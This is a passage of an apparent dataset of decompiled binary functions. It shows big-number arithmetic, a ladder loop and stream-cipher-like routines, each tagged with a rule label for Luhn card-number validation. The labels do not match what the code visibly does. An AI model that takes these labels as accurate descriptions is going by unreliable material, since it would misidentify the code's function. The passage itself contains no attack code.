arg_ch[4], arg_ch[4] >> 0x1f);\n    iVar3 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_ch[6], arg_ch[6] >> 0x1f);\n    uVar1 = fcn.00413150(iVar2 + iVar3, 2, 0);\n    arg_8h[6] = uVar1;\n    arg_8h[7] = uVar1 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[4], arg_ch[4] >> 0x1f);\n    uVar1 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, 4, 0);\n    iVar4 = fcn.00413150(uVar1, arg_ch[6], arg_ch[6] >> 0x1f);\n    uVar1 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, 2, 0);\n    iVar2 = fcn.00413150(uVar1, arg_ch[8], arg_ch[8] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar2;\n    arg_8h[8] = iVar2;\n    arg_8h[9] = iVar2 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[6], arg_ch[6] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[8], arg_ch[8] >> 0x1f);\n    iVar4 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_ch[10], arg_ch[10] >> 0x1f);\n    uVar1 = fcn.00413150(iVar2 + iVar3 + iVar4, 2, 0);\n    arg_8h[10] = uVar1;\n    arg_8h[0xb] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[6], arg_ch[6] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[8], arg_ch[8] >> 0x1f);\n    iVar4 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    uVar1 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, 2, 0);\n    iVar5 = fcn.00413150(uVar1, arg_ch[10], arg_ch[10] >> 0x1f);\n    uVar1 = fcn.00413150(iVar2 + iVar3 + iVar4 + iVar5, 2, 0);\n    arg_8h[0xc] = uVar1;\n    arg_8h[0xd] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[8], arg_ch[8] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[10], arg_ch[10] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar5 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    uVar1 = fcn.00413150(iVar2 + iVar3 + iVar4 + iVar5, 2, 0);\n    arg_8h[0xe] = uVar1;\n    arg_8h[0xf] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[8], arg_ch[8] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar4 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[10], arg_ch[10] >> 0x1f);\n    iVar5 = fcn.00413150(iVar5 + iVar6, 2, 0);\n    iVar3 = fcn.00413150(iVar3 + iVar4 + iVar5, 2, 0);\n    arg_8h[0x10] = iVar2 + iVar3;\n    arg_8h[0x11] = iVar2 + iVar3 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[10], arg_ch[10] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar6 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    uVar1 = fcn.00413150(iVar2 + iVar3 + iVar4 + iVar5 + iVar6, 2, 0);\n    arg_8h[0x12] = uVar1;\n    arg_8h[0x13] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_ch[10], arg_ch[10] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    iVar5 = fcn.00413150(iVar5 + iVar6, 2, 0);\n    uVar1 = fcn.00413150(iVar2 + iVar3 + iVar4 + iVar5, 2, 0);\n    arg_8h[0x14] = uVar1;\n    arg_8h[0x15] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    uVar1 = fcn.00413150(iVar2 + iVar3 + iVar4 + iVar5, 2, 0);\n    arg_8h[0x16] = uVar1;\n    arg_8h[0x17] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    iVar4 = fcn.00413150(iVar4 + iVar5, 2, 0);\n    iVar3 = fcn.00413150(iVar3 + iVar4, 2, 0);\n    arg_8h[0x18] = iVar2 + iVar3;\n    arg_8h[0x19] = iVar2 + iVar3 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    uVar1 = fcn.00413150(iVar2 + iVar3 + iVar4, 2, 0);\n    arg_8h[0x1a] = uVar1;\n    arg_8h[0x1b] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    uVar1 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, 2, 0);\n    iVar4 = fcn.00413150(uVar1, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    uVar1 = fcn.00413150(iVar2 + iVar3 + iVar4, 2, 0);\n    arg_8h[0x1c] = uVar1;\n    arg_8h[0x1d] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    uVar1 = fcn.00413150(iVar2 + iVar3, 2, 0);\n    arg_8h[0x1e] = uVar1;\n    arg_8h[0x1f] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    uVar1 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, 4, 0);\n    iVar3 = fcn.00413150(uVar1, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    arg_8h[0x20] = iVar2 + iVar3;\n    arg_8h[0x21] = iVar2 + iVar3 >> 0x20;\n    uVar1 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, 2, 0);\n    uVar1 = fcn.00413150(uVar1, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    arg_8h[0x22] = uVar1;\n    arg_8h[0x23] = uVar1 >> 0x20;\n    uVar1 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, 2, 0);\n    uVar1 = fcn.00413150(uVar1, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    arg_8h[0x24] = uVar1;\n    arg_8h[0x25] = uVar1 >> 0x20;\n    return;\n}\n",
        "token_count": 3969
    },
    "00407cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407cb0(uint32_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar1 = *arg_ch;\n    uVar2 = fcn.00413190();\n    uVar3 = fcn.00413190();\n    uVar4 = fcn.00413190();\n    *arg_8h = (uVar1 | uVar2 | uVar3 | uVar4) & 0x3ffffff;\n    arg_8h[1] = 0;\n    fcn.00413190();\n    fcn.00413190();\n    fcn.00413190();\n    uVar2 = fcn.004131b0();\n    arg_8h[2] = uVar2 & 0x1ffffff;\n    arg_8h[3] = 0;\n    fcn.00413190();\n    fcn.00413190();\n    fcn.00413190();\n    uVar2 = fcn.004131b0();\n    arg_8h[4] = uVar2 & 0x3ffffff;\n    arg_8h[5] = 0;\n    fcn.00413190();\n    fcn.00413190();\n    fcn.00413190();\n    uVar2 = fcn.004131b0();\n    arg_8h[6] = uVar2 & 0x1ffffff;\n    arg_8h[7] = 0;\n    fcn.00413190();\n    fcn.00413190();\n    fcn.00413190();\n    uVar2 = fcn.004131b0();\n    arg_8h[8] = uVar2 & 0x3ffffff;\n    arg_8h[9] = 0;\n    uVar1 = arg_ch[0x10];\n    uVar2 = fcn.00413190();\n    uVar3 = fcn.00413190();\n    uVar4 = fcn.00413190();\n    arg_8h[10] = (uVar1 | uVar2 | uVar3 | uVar4) & 0x1ffffff;\n    arg_8h[0xb] = 0;\n    fcn.00413190();\n    fcn.00413190();\n    fcn.00413190();\n    uVar2 = fcn.004131b0();\n    arg_8h[0xc] = uVar2 & 0x3ffffff;\n    arg_8h[0xd] = 0;\n    fcn.00413190();\n    fcn.00413190();\n    fcn.00413190();\n    uVar2 = fcn.004131b0();\n    arg_8h[0xe] = uVar2 & 0x1ffffff;\n    arg_8h[0xf] = 0;\n    fcn.00413190();\n    fcn.00413190();\n    fcn.00413190();\n    uVar2 = fcn.004131b0();\n    arg_8h[0x10] = uVar2 & 0x3ffffff;\n    arg_8h[0x11] = 0;\n    fcn.00413190();\n    fcn.00413190();\n    fcn.00413190();\n    uVar2 = fcn.004131b0();\n    arg_8h[0x12] = uVar2 & 0x1ffffff;\n    arg_8h[0x13] = 0;\n    return;\n}\n",
        "token_count": 803
    },
    "00408210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408210(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = ~(arg_8h ^ arg_ch) << 0x10 & ~(arg_8h ^ arg_ch);\n    uVar1 = uVar1 << 8 & uVar1;\n    uVar1 = uVar1 << 4 & uVar1;\n    uVar1 = uVar1 << 2 & uVar1;\n    return (uVar1 << 1 & uVar1) >> 0x1f;\n}\n",
        "token_count": 135
    },
    "00409060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409060(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_4fch;\n    uint auStack1276 [37];\n    uint var_464h;\n    uint auStack1124 [37];\n    uint var_3cch;\n    uint auStack972 [37];\n    uint var_334h;\n    uint auStack820 [37];\n    uint var_29ch;\n    uint auStack668 [37];\n    uint var_204h;\n    uint32_t auStack516 [37];\n    uint var_16ch;\n    uint32_t auStack364 [37];\n    uint var_d4h;\n    uint32_t auStack212 [37];\n    uint32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = &var_334h;\n    var_2ch = &var_d4h;\n    var_14h = &var_16ch;\n    var_18h = &var_3cch;\n    var_28h = &var_464h;\n    var_30h = &var_204h;\n    var_20h = &var_4fch;\n    var_24h = &var_29ch;\n    for (var_8h = 0; var_8h < 0x13; var_8h = var_8h + 1) {\n        auStack820[var_8h * 2 + -1] = 0;\n        auStack820[var_8h * 2] = 0;\n        auStack212[var_8h * 2 + -1] = 0;\n        auStack212[var_8h * 2] = 0;\n        auStack364[var_8h * 2 + -1] = 0;\n        auStack364[var_8h * 2] = 0;\n        auStack972[var_8h * 2 + -1] = 0;\n        auStack972[var_8h * 2] = 0;\n        auStack1124[var_8h * 2 + -1] = 0;\n        auStack1124[var_8h * 2] = 0;\n        auStack516[var_8h * 2 + -1] = 0;\n        auStack516[var_8h * 2] = 0;\n        auStack1276[var_8h * 2 + -1] = 0;\n        auStack1276[var_8h * 2] = 0;\n        auStack668[var_8h * 2 + -1] = 0;\n        auStack668[var_8h * 2] = 0;\n    }\n    var_d4h = 1;\n    auStack212[0] = 0;\n    var_16ch = 1;\n    auStack364[0] = 0;\n    var_204h = 1;\n    auStack516[0] = 0;\n    var_29ch = 1;\n    auStack668[0] = 0;\n    fcn.00412eb0(var_10h, arg_14h, 0x50);\n    for (var_1ch = 0; var_1ch < 0x20; var_1ch = var_1ch + 1) {\n        var_1h._0_1_ = *(arg_10h + (0x1f - var_1ch));\n        for (var_3ch = 0; var_3ch < 8; var_3ch = var_3ch + 1) {\n            var_38h = var_1h >> 7;\n            var_34h = 0;\n            fcn.00408fe0(var_14h, var_10h, var_38h);\n            fcn.00408fe0(var_18h, var_2ch, var_38h);\n            fcn.00408d30(var_20h, var_24h, var_28h, var_30h, var_14h, var_18h, var_10h, var_2ch, arg_14h);\n            fcn.00408fe0(var_20h, var_28h, var_38h);\n            fcn.00408fe0(var_24h, var_30h, var_38h);\n            puVar1 = var_20h;\n            var_20h = var_14h;\n            puVar2 = var_24h;\n            var_24h = var_18h;\n            puVar3 = var_28h;\n            var_28h = var_10h;\n            var_ch = var_2ch;\n            puVar4 = var_30h;\n            var_30h = var_2ch;\n            var_1h._0_1_ = var_1h << 1;\n            var_2ch = puVar4;\n            var_18h = puVar2;\n            var_14h = puVar1;\n            var_10h = puVar3;\n        }\n    }\n    fcn.00412eb0(arg_8h, var_14h, 0x50);\n    fcn.00412eb0(arg_ch, var_18h, 0x50);\n    return;\n}\n",
        "token_count": 1330
    },
    "0040b280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b280(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_24h;\n    uint var_4h;\n    \n    uVar3 = *(arg_8h + 0x1080) & 0x1ff;\n    uVar4 = uVar3 + 0x10 & 0x1ff;\n    if (*(arg_8h + 0x1080) < 0x200) {\n        *(arg_8h + 0x1080) = *(arg_8h + 0x1080) + 0x10U & 0x3ff;\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1010) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1010) >> 0x10 & 0xff) * 4);\n        *(arg_8h + uVar3 * 4) =\n             ((*(arg_8h + 4 + uVar3 * 4) >> 0x17 | *(arg_8h + 4 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1034) >> 10 | *(arg_8h + 0x1034) << 0x16)) +\n             (*(arg_8h + 0x1018) >> 8 | *(arg_8h + 0x1018) << 0x18) + *(arg_8h + uVar3 * 4);\n        *(arg_8h + 0x1000) = *(arg_8h + uVar3 * 4);\n        *arg_ch = iVar1 + iVar2 ^ *(arg_8h + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1014) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1014) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 4 + uVar3 * 4) =\n             ((*(arg_8h + 8 + uVar3 * 4) >> 0x17 | *(arg_8h + 8 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1038) >> 10 | *(arg_8h + 0x1038) << 0x16)) +\n             (*(arg_8h + 0x101c) >> 8 | *(arg_8h + 0x101c) << 0x18) + *(arg_8h + 4 + uVar3 * 4);\n        *(arg_8h + 0x1004) = *(arg_8h + 4 + uVar3 * 4);\n        arg_ch[1] = iVar1 + iVar2 ^ *(arg_8h + 4 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1018) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1018) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 8 + uVar3 * 4) =\n             ((*(arg_8h + 0xc + uVar3 * 4) >> 0x17 | *(arg_8h + 0xc + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x103c) >> 10 | *(arg_8h + 0x103c) << 0x16)) +\n             (*(arg_8h + 0x1020) >> 8 | *(arg_8h + 0x1020) << 0x18) + *(arg_8h + 8 + uVar3 * 4);\n        *(arg_8h + 0x1008) = *(arg_8h + 8 + uVar3 * 4);\n        arg_ch[2] = iVar1 + iVar2 ^ *(arg_8h + 8 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x101c) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x101c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0xc + uVar3 * 4) =\n             ((*(arg_8h + 0x10 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x10 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1000) >> 10 | *(arg_8h + 0x1000) << 0x16)) +\n             (*(arg_8h + 0x1024) >> 8 | *(arg_8h + 0x1024) << 0x18) + *(arg_8h + 0xc + uVar3 * 4);\n        *(arg_8h + 0x100c) = *(arg_8h + 0xc + uVar3 * 4);\n        arg_ch[3] = iVar1 + iVar2 ^ *(arg_8h + 0xc + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1020) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1020) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x10 + uVar3 * 4) =\n             ((*(arg_8h + 0x14 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x14 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1004) >> 10 | *(arg_8h + 0x1004) << 0x16)) +\n             (*(arg_8h + 0x1028) >> 8 | *(arg_8h + 0x1028) << 0x18) + *(arg_8h + 0x10 + uVar3 * 4);\n        *(arg_8h + 0x1010) = *(arg_8h + 0x10 + uVar3 * 4);\n        arg_ch[4] = iVar1 + iVar2 ^ *(arg_8h + 0x10 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1024) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1024) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x14 + uVar3 * 4) =\n             ((*(arg_8h + 0x18 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x18 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1008) >> 10 | *(arg_8h + 0x1008) << 0x16)) +\n             (*(arg_8h + 0x102c) >> 8 | *(arg_8h + 0x102c) << 0x18) + *(arg_8h + 0x14 + uVar3 * 4);\n        *(arg_8h + 0x1014) = *(arg_8h + 0x14 + uVar3 * 4);\n        arg_ch[5] = iVar1 + iVar2 ^ *(arg_8h + 0x14 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1028) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1028) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x18 + uVar3 * 4) =\n             ((*(arg_8h + 0x1c + uVar3 * 4) >> 0x17 | *(arg_8h + 0x1c + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x100c) >> 10 | *(arg_8h + 0x100c) << 0x16)) +\n             (*(arg_8h + 0x1030) >> 8 | *(arg_8h + 0x1030) << 0x18) + *(arg_8h + 0x18 + uVar3 * 4);\n        *(arg_8h + 0x1018) = *(arg_8h + 0x18 + uVar3 * 4);\n        arg_ch[6] = iVar1 + iVar2 ^ *(arg_8h + 0x18 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x102c) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x102c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1c + uVar3 * 4) =\n             ((*(arg_8h + 0x20 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x20 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1010) >> 10 | *(arg_8h + 0x1010) << 0x16)) +\n             (*(arg_8h + 0x1034) >> 8 | *(arg_8h + 0x1034) << 0x18) + *(arg_8h + 0x1c + uVar3 * 4);\n        *(arg_8h + 0x101c) = *(arg_8h + 0x1c + uVar3 * 4);\n        arg_ch[7] = iVar1 + iVar2 ^ *(arg_8h + 0x1c + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1030) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1030) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x20 + uVar3 * 4) =\n             ((*(arg_8h + 0x24 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x24 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1014) >> 10 | *(arg_8h + 0x1014) << 0x16)) +\n             (*(arg_8h + 0x1038) >> 8 | *(arg_8h + 0x1038) << 0x18) + *(arg_8h + 0x20 + uVar3 * 4);\n        *(arg_8h + 0x1020) = *(arg_8h + 0x20 + uVar3 * 4);\n        arg_ch[8] = iVar1 + iVar2 ^ *(arg_8h + 0x20 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1034) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1034) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x24 + uVar3 * 4) =\n             ((*(arg_8h + 0x28 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x28 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1018) >> 10 | *(arg_8h + 0x1018) << 0x16)) +\n             (*(arg_8h + 0x103c) >> 8 | *(arg_8h + 0x103c) << 0x18) + *(arg_8h + 0x24 + uVar3 * 4);\n        *(arg_8h + 0x1024) = *(arg_8h + 0x24 + uVar3 * 4);\n        arg_ch[9] = iVar1 + iVar2 ^ *(arg_8h + 0x24 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1038) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1038) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x28 + uVar3 * 4) =\n             ((*(arg_8h + 0x2c + uVar3 * 4) >> 0x17 | *(arg_8h + 0x2c + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x101c) >> 10 | *(arg_8h + 0x101c) << 0x16)) +\n             (*(arg_8h + 0x1000) >> 8 | *(arg_8h + 0x1000) << 0x18) + *(arg_8h + 0x28 + uVar3 * 4);\n        *(arg_8h + 0x1028) = *(arg_8h + 0x28 + uVar3 * 4);\n        arg_ch[10] = iVar1 + iVar2 ^ *(arg_8h + 0x28 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x103c) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x103c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x2c + uVar3 * 4) =\n             ((*(arg_8h + 0x30 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x30 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1020) >> 10 | *(arg_8h + 0x1020) << 0x16)) +\n             (*(arg_8h + 0x1004) >> 8 | 